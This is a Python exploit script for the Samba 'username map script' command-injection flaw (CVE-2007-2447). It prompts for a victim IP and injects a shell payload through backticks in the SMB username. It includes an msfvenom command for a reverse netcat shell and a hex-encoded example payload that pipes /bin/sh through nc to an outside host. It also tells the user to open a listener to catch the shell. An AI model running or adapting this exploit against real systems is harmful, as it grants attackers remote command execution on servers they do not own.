#!/usr/bin/python3
# CVE-2007-2447
# Fixed and totally functional

from smb import *
from smb.SMBConnection import *

banner = """
 ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____
||C |||V |||E |||- |||2 |||0 |||0 |||7 |||- |||2 |||4 |||4 |||7 ||
||__|||__|||__|||__|||__|||__|||__|||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|

                        [+] Samba "username map script" Command Execution
                        [@] Developed by Fabricio Araujo (c1sco0)
                        
"""
print(banner)




# msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.5 LPORT=1337 -f python

''' PUT YOUR SHELLCODE HERE AND ERASE THE BYTES (b) FOR EVADE SOME ERRORS
EXAMPLE: 
buf =  ""
buf += "\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x75"
buf += "\x75\x61\x6e\x6c\x3b\x20\x6e\x63\x20\x31\x30\x2e\x31"
buf += "\x30\x2e\x31\x34\x2e\x31\x36\x20\x34\x34\x33\x20\x30"
buf += "\x3c\x2f\x74\x6d\x70\x2f\x75\x75\x61\x6e\x6c\x20\x7c"
buf += "\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e\x2f\x74\x6d"
buf += "\x70\x2f\x75\x75\x61\x6e\x6c\x20\x32\x3e\x26\x31\x3b"
buf += "\x20\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x75\x75\x61\x6e"
buf += "\x6c" '''


# IP Victim

ip = input("\n\n[*] Victim IP: \n\n")
print("\n\n[*] Put a nc listener to recieve the reverse shell\n\n")
print("\n[+] Pwn3d!!!\n")

# SambaPld

userID = "/=` nohup " + buf + "`"
password = 'password'
victim_ip = ip

conn = SMBConnection(userID, password, "GIVEME", "THATRCE", use_ntlm_v2=False)
conn.connect(victim_ip, 445)

